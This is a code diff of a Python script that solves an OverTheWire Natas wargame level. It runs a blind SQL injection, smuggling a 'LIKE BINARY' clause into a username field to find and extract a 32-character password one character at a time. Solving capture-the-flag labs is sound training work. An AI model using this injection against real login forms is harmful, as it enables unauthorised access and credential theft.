@@ -12,18 +12,6 @@ password = ""
 filtered_characters = ""
 
 
-for character in CHARS:
-    respones = post(
-        URL,
-        data={
-            "username": f'{NAME}" AND password LIKE BINARY "%{character}%" #'
-        },
-        auth=auth
-    )
-    if "exists" in respones.text:
-        filtered_characters += character
-
-
 def get_respones(character: str) -> str:
     """get respones of url with data and auth
 
@@ -45,15 +33,26 @@ def get_respones(character: str) -> str:
     return ''
 
 
+for char in CHARS:
+    testing_respones = post(
+        URL,
+        data={
+            "username": f'{NAME}" AND password LIKE BINARY "%{char}%" #'
+        },
+        auth=auth
+    )
+    if "exists" in testing_respones.text:
+        filtered_characters += char
+
 print(f"Currect characters: {filtered_characters}")
 
-while len(password) < 32:
-    print(f"length: {len(password)}, password: {password}")
+for _ in range(32):
     for testing_character in filtered_characters:
         current_char = get_respones(testing_character)
         if current_char:
             password += current_char
             break
+    print(f"length: {len(password)}, password: {password}")
 
 print("-"*64)
 print("Link: http://natas16.natas.labs.overthewire.org/index.php")
